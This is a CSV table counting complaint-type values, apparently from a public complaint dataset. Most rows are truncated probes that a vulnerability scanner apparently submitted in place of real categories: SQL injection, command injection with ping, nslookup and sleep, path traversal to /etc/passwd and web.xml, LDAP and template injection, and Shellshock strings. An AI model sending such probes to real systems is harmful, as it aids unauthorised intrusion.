Complaint Type,count
Misc. Comments}}t2v95'/&quo...,1
@(9313*3464),1
.../....///.../....///.../....,1
Misc. Comments' and '1618'=...,1
Misc. Comments&echo xjd...,1
*)(!(objectClass=*),1
Misc. Comments')waitfor del...,1
Misc. Comments|ping -n 21 1...,1
Misc. Comments' waitfor del...,1
Misc. Comments'+(function()...,1
%2e%2e%5c%2e%2e%5c%2e%2e%5c...,1
Fire Alarm - Replacement,1
%c0%ae/WEB-INF/web.xml,1
Misc. Comments&ping -n ...,1
Misc. Commentseowljujfh8,1
.../Misc. Comments,1
qfix4${695*589}lixaf,1
Building Condition,1
/./validate_form.php,1
./validate_form.php,1
Misc. Comments'(select*from...,1
Misc. Comments  BCC:a5glxzf...,1
Misc. Comments');declare @q...,1
Adopt-A-Basket,1
idexf3mrb7)(!(objectClass=*),1
%2fetc%2fpasswd,1
Misc. Comments' and 6049=60...,1
/etc/passwd,1
*)(objectClass=*,1
%E5%98%8A%E5%98%8DX-Injecti...,1
Misc. Comments52038737' or ...,1
Misc. Comments47876391' or ...,1
(select load_file('\\\\615h...,1
Misc. Commentso0w3r%>xb6...,1
Misc. Comments'||(select ex...,1
Misc. Comments|nslookup -q=...,1
"\"\"\"-->'-->`-->&...\"",1
../../WEB-INF/web.xml;x=,1
.../...//.../...//.../...//...,1
%c0%ae/%c0%ae/%c0%ae/WEB-IN...,1
() { _; } >_,1
Stalled Sites,1
file:///c:/windows/win.ini,1
../WEB-INF/web.xml,1
bcd9<!--esi-->1ggp&lt...,1
Misc. Comments'|ping -c 21 ...,1
../WEB-INF/web.xml;x=,1
Misc. Comments{${sleep(20)}},1
Misc. Comments);declare @q ...,1
"\"Misc. Comments\"\"|ping -...\"",1
kawn''lcgv,1
Construction,1
%{(#dm=@ognl.OgnlContext@DE...,1
() { :;}; /bin/sleep 0,1
%c0%ae/%c0%ae/%c0%ae/%c0%ae...,1
() { :;}; /bin/sleep 11,1
Misc. Comments'.sleep(20).',1
"Misc. Comments,(select*from...",1
Dispatched Taxi Compliment,1
"Misc. Comments',0)waitfor d...",1
...\./...\./...\./...\./......,1
c:\windows\win.ini,1
eval(compile('for x in rang...,1
Misc. Comments'+sleep(20.to...,1
%c0%ae/%c0%ae/WEB-INF/web.xml,1
Misc. Comments|ping -c 21 1...,1
.../.\.../.\.../.\.../.\......,1
(select extractvalue(xmltyp...,1
Employee Behavior,1
$(sleep 11),1
Misc. Comments'|echo y9v6fc...,1
Misc. Comments'+(select*fro...,1
Misc. Comments'+eval(compil...,1
Misc. Comments' and (select...,1
1430*4963,1
nslookup -q=cname nneyfcxgy...,1
%2e%2e%2f%2e%2e%2f%2e%2e%2f...,1
${3804*3137},1
../../../WEB-INF/web.xml;x=,1
`sleep 11`,1
../../../../WEB-INF/web.xml,1
266dyrgvhg1egsyp2oq57axbm2s...,1
Request Changes - A.S.P.,1
Misc. Comments|echo 3p7wexz...,1
Trans Fat,1
Misc. Comments&nslookup...,1
Misc. Comments88909845' or ...,1
Electric,1
http://g7orz5h9iu2sh6z332rj...,1
"\"Misc. Comments'\"\"`0&amp...\"",1
...\.\...\.\...\.\...\.\......,1
Misc. Comments]]>><,1
"\"<vlv xmlns=\"\"http://...\"",1
Misc. Comments',1
"Misc. Comments\"\"",1
\windows\win.ini,1
MSOTHER,1
Select Message Type...,1
../../WEB-INF/web.xml,1
Misc. Comments;declare @q v...,1
..././..././..././..././......,1
DEP Highway Condition,1
../../../WEB-INF/web.xml,1
{!xmlparser v='<!DOCTYPE...,1
yw97y0gi2s,1
Advocate-Foreclosure,1
Misc. Comments%}dt2pq'/&quo...,1
Misc. Comments>  BCC:bl0...,1
hcvn1{{687*375}}gji51,1
c:\windows\win.ini Misc. Co...,1
"\"Misc. Comments\"\"|echo 2...\"",1
Water Leak,1
"\"<odb xmlns:xi=\"\"http...\"",1
"\"a'a\\'b\"\"c>?>%}}%%...\"",1
Misc. Comments'+(select loa...,1
g0oii1s4s5)(objectClass=*,1
Misc. Comments';declare @q ...,1
Misc. Comments' and 7702=77...,1
Advocate-Prop Class Incorrect,1
%{4761*8506},1
Misc. Comments69075347' or ...,1
